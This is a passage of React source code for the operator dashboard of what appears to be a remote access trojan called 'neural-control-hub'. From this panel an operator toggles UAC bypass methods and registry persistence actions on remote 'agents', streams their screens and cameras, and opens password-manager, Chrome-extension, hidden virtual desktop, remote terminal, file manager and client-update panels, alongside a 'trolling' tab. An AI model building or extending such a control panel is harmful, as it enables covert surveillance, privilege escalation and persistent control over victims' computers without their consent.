                              toast.error(`❌ ${name} test failed`, {
                                description: 'Admin privileges required'
                              });
                            } else {
                              toast.warning(`⚠️ ${name} test failed`, {
                                description: 'Operation skipped or failed'
                              });
                            }
                          } catch (error) {
                            console.error(`Error testing ${action.key}:`, error);
                            results.push({
                              name: fmt(action.key),
                              key: action.key,
                              success: false,
                              needAdmin: false,
                              wasPresent: false,
                              error: 'Network error'
                            });
                            toast.error(`❌ ${fmt(action.key)}`, {
                              description: 'Network error occurred'
                            });
                          }
                        }

                        // Summary notification
                        const successful = results.filter(r => r.success).length;
                        const failed = results.filter(r => !r.success).length;
                        const adminRequired = results.filter(r => r.needAdmin).length;

                        if (successful === results.length) {
                          toast.success('🎉 All registry tests completed successfully!', {
                            description: `${successful}/${results.length} registry actions tested successfully`
                          });
                        } else {
                          toast.warning('⚠️ Registry tests completed with issues', {
                            description: `${successful} succeeded, ${failed} failed (${adminRequired} need admin)`
                          });
                        }
                      }}
                      disabled={!registryData?.actions?.some(a => a.enabled)}
                    >
                      Test All Enabled
                    </Button>
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="space-y-1">
                        {(registryData?.actions || []).map((a) => (
                        <div key={a.key} className="flex items-center justify-between text-sm">
                          <span>{fmt(a.key)}</span>
                          <div className="flex items-center gap-2">
                            <Badge variant={a.enabled ? 'default' : 'secondary'}>
                              {a.enabled ? 'Enabled' : 'Disabled'}
                            </Badge>
                            <Switch
                              checked={a.enabled}
                              onCheckedChange={async (checked) => {
                                const res = targetAgentId ? await api.toggleAgentRegistry(targetAgentId!, a.key, checked) : await api.toggleRegistry(a.key, checked);
                                if (res.success) {
                                  const d = res.data as any;
                                  setRegistryData((prev) => ({ ...(prev || { actions: [] }), actions: d.actions || [] }));
                                  toast.success(`${a.key} ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : ''}`);
                                } else {
                                  const errorMsg = res.error || 'Failed to update registry';
                                  if (res.message?.includes('admin')) {
                                    toast.error('Admin privileges required', { 
                                      description: 'Cannot modify registry without admin access. Please ensure the agent has admin privileges.' 
                                    });
                                  } else {
                                    toast.error(errorMsg);
                                  }
                                }
                              }}
                            />
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={async () => {
                                const name = fmt(a.key);
                                
                                // First check if registry key is present
                                try {
                                  const presenceRes = await api.checkRegistryPresence(a.key);
                                  const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
                                  const registryPath = (presenceRes.data as any)?.result?.path;
                                  const currentValue = (presenceRes.data as any)?.result?.value;
                                  
                                  if (isPresent) {
                                    toast.info(`🔍 ${name} already exists`, {
                                      description: `Registry key found at: ${registryPath}${currentValue ? ` (Value: ${JSON.stringify(currentValue)})` : ''}`
                                    });
                                  } else {
                                    toast.warning(`🔍 ${name} not found`, {
                                      description: 'Registry key does not exist in the Windows Registry Editor'
                                    });
                                  }
                                } catch (presenceError) {
                                  console.error('Error checking registry presence:', presenceError);
                                  toast.error(`❌ Failed to check ${name} presence`, {
                                    description: 'Unable to verify if registry key exists'
                                  });
                                }
                                
                                // Then proceed with the actual test
                                const res = await api.testRegistry(a.key);
                                const ok = res.success && (res.data as any)?.result?.executed;
                                const needAdmin = (res.data as any)?.result?.need_admin;
                                
                                if (ok) {
                                  toast.success(`✅ Successfully added ${name} to registry`, {
                                    description: `Registry key has been created/updated successfully in the agent's registry editor.`
                                  });
                                } else if (needAdmin) {
                                  toast.error(`❌ Failed to add ${name}`, {
                                    description: 'Administrator privileges are required for this operation. The agent needs admin access to modify this registry key.'
                                  });
                                } else {
                                  toast.warning(`⚠️ Failed to add ${name}`, {
                                    description: 'Operation was skipped or returned failure status. The registry key may already exist or the action is not applicable.'
                                  });
                                }
                              }}
                            >
                              Test
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                </CardContent>
              </Card>

              <Dialog open={isScanDialogOpen} onOpenChange={setIsScanDialogOpen}>
                <DialogContent className="max-w-4xl max-h-[80vh] overflow-hidden flex flex-col">
                  <DialogHeader>
                    <DialogTitle>System Diagnostic Report</DialogTitle>
                    <DialogDescription>
                      Analysis of bypass mechanisms and registry entries connectivity and execution status.
                    </DialogDescription>
                  </DialogHeader>
                  
                  <div className="flex items-center gap-4 py-4">
                    <div className="flex-1 space-y-1">
                      <div className="flex justify-between text-sm text-muted-foreground">
                        <span>Progress</span>
                        <span>{scanProgress}%</span>
                      </div>
                      <Progress value={scanProgress} />
                    </div>
                  </div>

                  <div className="flex-1 overflow-auto border rounded-md">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Component</TableHead>
                          <TableHead>Type</TableHead>
                          <TableHead>State</TableHead>
                          <TableHead>Status</TableHead>
                          <TableHead>Details</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {scanResults.map((result, i) => (
                          <TableRow key={i}>
                            <TableCell className="font-medium">{result.name}</TableCell>
                            <TableCell>
                              <Badge variant="outline" className={result.type === 'bypass' ? 'border-blue-500 text-blue-500' : 'border-purple-500 text-purple-500'}>
                                {result.type.toUpperCase()}
                              </Badge>
                            </TableCell>
                            <TableCell>
                              <Badge variant={result.enabled ? 'default' : 'secondary'}>
                                {result.enabled ? 'Enabled' : 'Disabled'}
                              </Badge>
                            </TableCell>
                            <TableCell>
                                <div className="flex items-center gap-2">
                                    {result.status === 'verified' && <CheckCircle2 className="h-4 w-4 text-green-500" />}
                                    {result.status === 'toggle_only' && <Circle className="h-4 w-4 text-yellow-500" />}
                                    {result.status === 'error' && <ShieldAlert className="h-4 w-4 text-red-500" />}
                                    {result.status === 'missing' && <AlertCircle className="h-4 w-4 text-orange-500" />}
                                    <span className={
                                        result.status === 'verified' ? 'text-green-500' :
                                        result.status === 'toggle_only' ? 'text-yellow-500' :
                                        result.status === 'error' ? 'text-red-500' : ''
                                    }>
                                        {result.message}
                                    </span>
                                </div>
                            </TableCell>
                            <TableCell className="text-muted-foreground text-xs font-mono">
                                {result.details}
                            </TableCell>
                          </TableRow>
                        ))}
                        {scanResults.length === 0 && !isScanning && (
                            <TableRow>
                                <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">
                                    Click "Run Full Scan" to start diagnostics
                                </TableCell>
                            </TableRow>
                        )}
                      </TableBody>
                    </Table>
                  </div>
                </DialogContent>
              </Dialog>
                </TabsContent>
                
                <TabsContent
                  value="trolling"
                  className="space-y-6"
                >
                  <BulkUploadManager />
                </TabsContent>
                <TabsContent
                  value="agents"
                  className="space-y-6"
                >
                  <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                    {filteredAgents.map((agent: Agent) => (
                      <AgentCard
                        key={agent.id}
                        agent={agent}
                        isSelected={selectedAgent === agent.id}
                        onSelect={() =>
                          setSelectedAgent(agent.id)
                        }
                      />
                    ))}
                  </div>
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Bypasses and registry controls per selected agent</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        const methods = cfg?.bypasses?.methods || {};
                        const actions = cfg?.registry?.actions || {};
                        const methodCount = Object.values(methods).filter(Boolean).length;
                        const actionCount = Object.values(actions).filter(Boolean).length;
                        return (
                          <div className="space-y-4">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="flex items-center justify-between">
                                <Label htmlFor="agents-bypass-enabled">Bypasses Enabled</Label>
                                <Switch
                                  id="agents-bypass-enabled"
                                  checked={bEnabled}
                                  onCheckedChange={(checked) => {
                                    if (!aid) return;
                                    sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                  }}
                                />
                              </div>
                              <div className="flex items-center justify-between">
                                <Label htmlFor="agents-registry-enabled">Registry Enabled</Label>
                                <Switch
                                  id="agents-registry-enabled"
                                  checked={rEnabled}
                                  onCheckedChange={(checked) => {
                                    if (!aid) return;
                                    sendCommand(aid, checked ? "registry:on" : "registry:off");
                                  }}
                                />
                              </div>
                            </div>
                            <div className="flex items-center justify-between">
                              <span className="text-sm">Enabled UAC Methods</span>
                              <Badge variant="secondary">{methodCount}</Badge>
                            </div>
                            <div className="flex items-center justify-between">
                              <span className="text-sm">Enabled Registry Actions</span>
                              <Badge variant="secondary">{actionCount}</Badge>
                            </div>
                            <div className="flex flex-col sm:flex-row items-stretch gap-2">
                              <Button
                                disabled={!aid}
                                className="w-full sm:w-auto"
                                onClick={() => {
                                  if (!aid) return;
                                  sendCommand(aid, bEnabled ? "bypasses:on" : "bypasses:off");
                                }}
                              >
                                Apply Bypasses To Selected
                              </Button>
                              <Button
                                variant="outline"
                                disabled={!aid}
                                className="w-full sm:w-auto"
                                onClick={() => {
                                  if (!aid) return;
                                  sendCommand(aid, rEnabled ? "registry:on" : "registry:off");
                                }}
                              >
                                Apply Registry To Selected
                              </Button>
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                </TabsContent>

                <TabsContent
                  value="streaming"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Apply bypasses and registry for streaming operations</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        return (
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="stream-bypass-enabled">Bypasses Enabled</Label>
                              <Switch
                                id="stream-bypass-enabled"
                                checked={bEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                }}
                              />
                            </div>
                            <div className="flex items-center justify-between">
                              <Label htmlFor="stream-registry-enabled">Registry Enabled</Label>
                              <Switch
                                id="stream-registry-enabled"
                                checked={rEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
                                }}
                              />
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <StreamViewer
                      agentId={selectedAgent}
                      type="screen"
                      title="Screen Stream"
                    />
                    <StreamViewer
                      agentId={selectedAgent}
                      type="camera"
                      title="Camera Stream"
                    />
                  </div>
                </TabsContent>

                <TabsContent value="password_manager" className="space-y-6">
                  <PasswordManager />
                </TabsContent>
                <TabsContent value="chrome_extension" className="space-y-6">
                  <ChromeExtensionPanel />
                </TabsContent>


                

                <TabsContent value="virtual" className="space-y-6">
                  <VirtualDesktop agentId={selectedAgent} />
                </TabsContent>
 
                <TabsContent
                  value="commands"
                  className="space-y-6"
                >
                  <Tabs value={toolsTab} onValueChange={setToolsTab} className="space-y-4">
                    <TabsList className="grid w-full grid-cols-2">
                      <TabsTrigger value="terminal">Terminal</TabsTrigger>
                      <TabsTrigger value="processes">Process Manager</TabsTrigger>
                    </TabsList>
                    <TabsContent value="terminal">
                      <CommandPanel agentId={selectedAgent} />
                    </TabsContent>
                    <TabsContent value="processes">
                      <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading processes…</div>}>
                        <ProcessManagerLazy
                          agentId={selectedAgent}
                          isConnected={onlineAgents.length > 0}
                        />
                      </Suspense>
                    </TabsContent>
                  </Tabs>
                </TabsContent>

                <TabsContent
                  value="files"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Controls</CardTitle>
                      <CardDescription>Apply bypasses and registry that affect file operations</CardDescription>
                    </CardHeader>
                    <CardContent>
                      {(() => {
                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                        const cfg = aid ? agentConfig?.[aid] : null;
                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
                        const rEnabled = Boolean(cfg?.registry?.enabled);
                        return (
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="files-bypass-enabled">Bypasses Enabled</Label>
                              <Switch
                                id="files-bypass-enabled"
                                checked={bEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
                                }}
                              />
                            </div>
                            <div className="flex items-center justify-between">
                              <Label htmlFor="files-registry-enabled">Registry Enabled</Label>
                              <Switch
                                id="files-registry-enabled"
                                checked={rEnabled}
                                onCheckedChange={(checked) => {
                                  if (!aid) return;
                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
                                }}
                              />
                            </div>
                          </div>
                        );
                      })()}
                    </CardContent>
                  </Card>
                  <FileManager agentId={selectedAgent} />
                </TabsContent>

                <TabsContent value="update_client" className="space-y-6">
                  <UpdateClientPanel />
                </TabsContent>

                

                
              </Tabs>
            )}

            {/* Settings Page */}
            {activeTab === "settings" && (
              <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading settings…</div>}>
                <SettingsLazy />
              </Suspense>
            )}

            {/* About Page */}
            {activeTab === "about" && (
              <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading about…</div>}>
                <AboutLazy />
              </Suspense>
            )}
              </div>
            </ErrorBoundary>
          </main>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  return (
    <ThemeProvider
      defaultTheme="system"
      storageKey="neural-control-hub-theme"
    >
      <AppContent />
      <Toaster position="top-right" richColors />
    </ThemeProvider>
  );
}
